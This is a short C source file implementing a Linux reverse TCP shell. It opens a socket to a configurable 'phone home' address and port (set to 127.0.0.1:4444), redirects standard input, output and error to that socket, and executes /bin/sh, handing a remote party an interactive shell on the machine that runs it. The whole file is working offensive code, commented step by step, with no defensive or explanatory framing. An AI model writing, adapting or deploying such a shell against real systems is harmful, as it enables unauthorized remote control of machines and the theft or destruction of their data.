/* Simple linux reverse tcp shell in c */

#include <stdio.h> /* Standard input output */
#include <unistd.h> /* POSIX API */
#include <netinet/in.h> /* Internet protocol family */
#include <sys/types.h> /* Typedef symbols and strcutures */
#include <sys/socket.h> /* Socket definitions */
#include <arpa/inet.h> /* Internet operations */

#define REMOTE_ADDR "127.0.0.1" /* address to phone home */
#define REMOTE_PORT 4444 /* port number to phone home */

int main(int argc, char *argv[])
{
    struct sockaddr_in a; /* structure to store our address info */
    int b; /* define variable for socket */

    a.sin_family = AF_INET; /* address family */
    a.sin_addr.s_addr = inet_addr(REMOTE_ADDR); /* ip address */
    a.sin_port = htons(REMOTE_PORT); /* port */

    b = socket(AF_INET, SOCK_STREAM, 0);  /* create socket */
    connect(b, (struct sockaddr *)&a, sizeof(a)); /* connect system call */
    dup2(b, 0); /* dup syscall on stdin fd */
    dup2(b, 1); /* dup syscall on stdout fd */
    dup2(b, 2); /* dup syscall on stderr fd */

    execve("/bin/sh", 0, 0); /* execute /bin/sh on target */
    return 0;
}
